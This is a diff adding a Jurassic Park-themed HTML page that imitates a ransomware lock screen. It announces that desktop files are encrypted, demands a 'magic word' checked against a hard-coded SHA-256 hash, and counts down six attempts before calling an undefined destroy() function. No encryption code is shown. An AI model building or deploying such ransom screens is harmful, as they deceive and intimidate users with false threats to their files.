@@ -1,0 +1,59 @@
+<head>
+    <title>What is the magic word?</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/sha256.min.js"></script>
+    
+    <script>
+        let attempts = 6;
+
+        function checking() {
+            let input = document.getElementById('user_input').value;
+            var hash = CryptoJS.SHA256(input);
+
+            if (hash != "a7966ce5243b251a91c449d9311609ddc694cce84525ac9514b9ecd0acc87580") {
+                document.body.style.backgroundImage = "url('https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExanR0eHMyN3lpbjlva3Q4MDc3OHFlOGNnaWgxZmltbmNuZDJhaHVvdyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/5ftsmLIqktHQA/giphy.gif')";
+                document.getElementById('audio').play();
+
+                
+                attempts--;
+                document.querySelector("#countdown").innerHTML = attempts;
+
+                if (attempts <= 0) {
+                    destroy();
+                }
+
+            } else {
+                decrypt();
+                window.alert("Your files have been decrypted and you can now turn off your computer")
+            }
+        }
+    </script>
+
+</head>
+
+<body style="background-image:url('https://lovethynerd.com/wp-content/uploads/2019/04/Jurassic-Park-5-inline-photo.jpg?x99318'); background-repeat: no-repeat;  background-size: cover; background-position: center center;">
+    <div style="margin: auto;width: 50%;padding: 10px;text-align: center;">
+        <h1 style="color: white;">Your desktop files have been encrypted!</h1>
+        <h3 style="color: white;">Enter the magic word below to decrypt them.</h3>
+        <h5 style="color: white;">Turning off your computer or program will not help.</h3>
+
+    </div>
+
+    <div>
+        <h1 id="countdown" style="margin: auto;width: 50%;padding: 10px;text-align: center; color: red; font-weight: bold;"></h2>
+    </div>
+
+    <div style="margin: auto;width: 50%;padding: 10px; padding-top: 30%; padding-right: 10%;">
+        <form>
+            <label for="user_input" style="color: white;">Enter the magic word</label>
+            <input type="text" id="user_input" placeholder="????" required>
+            <input type="submit" onclick="checking()">
+        </form>
+    </div>
+</body>
+
+<footer>
+    <audio id="audio" loop playsinline>
+        <source src="https://www.myinstants.com/media/sounds/dennis_nedry_ahahah.mp3" type="audio/mpeg">
+    </audio>
+</footer>
